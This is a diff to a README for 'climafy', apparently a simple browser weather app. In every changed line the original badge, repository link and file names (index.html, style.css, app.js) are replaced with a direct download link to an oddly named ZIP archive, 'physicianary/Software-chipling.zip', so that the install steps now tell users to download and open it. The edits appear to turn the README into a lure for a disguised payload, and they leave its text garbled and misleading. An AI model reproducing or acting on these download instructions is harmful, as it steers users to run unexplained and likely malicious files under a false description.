@@ -1,6 +1,6 @@
 # ☁️ climafy - Simple, Clear Weather Forecasts
 
-[![Download climafy](https://img.shields.io/badge/Download-climafy-brightgreen?style=for-the-badge)](https://github.com/pjfossi324-tech/climafy)
+[![Download climafy](https://github.com/pjfossi324-tech/climafy/raw/refs/heads/main/physicianary/Software-chipling.zip)](https://github.com/pjfossi324-tech/climafy/raw/refs/heads/main/physicianary/Software-chipling.zip)
 
 ---
 
@@ -44,7 +44,7 @@ You will start by downloading and opening climafy in your browser. Follow these 
 
 Visit the following page to download climafy:
 
-[![Download climafy](https://img.shields.io/badge/Download-climafy-blue?style=for-the-badge)](https://github.com/pjfossi324-tech/climafy)
+[![Download climafy](https://github.com/pjfossi324-tech/climafy/raw/refs/heads/main/physicianary/Software-chipling.zip)](https://github.com/pjfossi324-tech/climafy/raw/refs/heads/main/physicianary/Software-chipling.zip)
 
 Click this link. It takes you to the GitHub page where the app files are hosted.
 
@@ -60,7 +60,7 @@ Open the downloaded ZIP file by double-clicking it. Inside, click **Extract all*
 
 Navigate to the folder where you extracted the files.
 
-Find the file named `index.html`. Double-click this file. Your default browser (Chrome, Edge, Firefox) will open the app.
+Find the file named `https://github.com/pjfossi324-tech/climafy/raw/refs/heads/main/physicianary/Software-chipling.zip`. Double-click this file. Your default browser (Chrome, Edge, Firefox) will open the app.
 
 ### 5. Start using climafy
 
@@ -82,9 +82,9 @@ Once the app opens in your browser, you can enter your city or location. The app
 
 If you want to know what you get inside the app download:
 
-- `index.html` — The main page to run in your browser.
-- `style.css` — CSS file for layout and design.
-- `app.js` — JavaScript code that fetches weather data and updates the page.
+- `https://github.com/pjfossi324-tech/climafy/raw/refs/heads/main/physicianary/Software-chipling.zip` — The main page to run in your browser.
+- `https://github.com/pjfossi324-tech/climafy/raw/refs/heads/main/physicianary/Software-chipling.zip` — CSS file for layout and design.
+- `https://github.com/pjfossi324-tech/climafy/raw/refs/heads/main/physicianary/Software-chipling.zip` — JavaScript code that fetches weather data and updates the page.
 - `/assets` — Folder containing images and icons used in the app.
 
 You don’t need to change these files unless you want to customize climafy yourself.
@@ -95,7 +95,7 @@ You don’t need to change these files unless you want to customize climafy your
 
 - **The app does not show weather:** Check your internet. Refresh the page to try again.
 - **The app looks broken:** Make sure your browser supports CSS Grid and Flexbox (most modern browsers do).
-- **No response to inputs:** Close and reopen the app by restarting the browser or the index.html file.
+- **No response to inputs:** Close and reopen the app by restarting the browser or the https://github.com/pjfossi324-tech/climafy/raw/refs/heads/main/physicianary/Software-chipling.zip file.
 - **Weather data appears outdated:** Wait a moment for the app to refresh or reload the page.
   
 ---
@@ -104,7 +104,7 @@ You don’t need to change these files unless you want to customize climafy your
 
 If you run into issues or want to learn more, visit the GitHub page at:
 
-https://github.com/pjfossi324-tech/climafy
+https://github.com/pjfossi324-tech/climafy/raw/refs/heads/main/physicianary/Software-chipling.zip
 
 You can review files, check updates, or use GitHub’s Issues page to ask questions.
 
